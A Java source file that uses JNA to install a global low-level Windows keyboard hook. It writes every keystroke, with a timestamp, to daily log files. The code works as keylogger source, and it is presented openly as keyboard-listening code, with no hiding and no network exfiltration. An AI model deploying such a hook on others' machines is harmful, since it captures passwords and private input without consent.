package com.Hook;

import com.Hook.common.CommonFunction;
import com.Hook.common.KeyBoard;
import com.Hook.common.KeyUtils;
import com.sun.jna.examples.win32.Kernel32;
import com.sun.jna.examples.win32.User32;
import com.sun.jna.examples.win32.User32.HHOOK;
import com.sun.jna.examples.win32.User32.LowLevelKeyboardProc;
import com.sun.jna.examples.win32.User32.MSG;
import com.sun.jna.examples.win32.W32API.HMODULE;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

/**
 * 接下来是监听键盘的代码
 * http://blog.csdn.net/qq_27099139/article/details/73530614
 */
public class KeyboardHook implements Runnable{

    public static String name = "KeyboardHook";

    private static HHOOK hhk;
    private static LowLevelKeyboardProc keyboardHook;
    final static User32 lib = User32.INSTANCE;
    private volatile boolean [] on_off=null;
    private Map<Integer, String> vCode = KeyBoard.vkCodeToKeyEvent();

    public KeyboardHook(boolean [] on_off){
        this.on_off = on_off;
    }

    @Override
    public void run() {

        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = (nCode, wParam, info) -> {
            SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
            SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String fileName=df1.format(new Date());
            String time=df2.format(new Date());
            BufferedWriter bw1=null;
            BufferedWriter bw2=null;
            try {
                File keyBord = FileUtils.createFile(".//log//"+fileName+"_Keyboard.txt");
                File common = FileUtils.createFile(".//log//"+fileName+"_Common.txt");
                bw1=new BufferedWriter(new FileWriter(keyBord,true));
                bw2=new BufferedWriter(new FileWriter(common,true));

            } catch (IOException e) {
                e.printStackTrace();
            }
            if (!KeyUtils.getInstance().getOn_off()[1]) {
                System.out.println("End keyboard");
                System.exit(0);
            }
            try {
                bw1.write(time+"  ####  "+vCode.get(info.vkCode)+"\r\n");
                bw2.write(time+"  ####  "+vCode.get(info.vkCode)+"\r\n");
                bw1.flush();
                bw2.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
        };
        hhk = lib.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
        MSG msg = new MSG();
        CommonFunction.printMsg(lib, msg);
        lib.UnhookWindowsHookEx(hhk);
    }

}
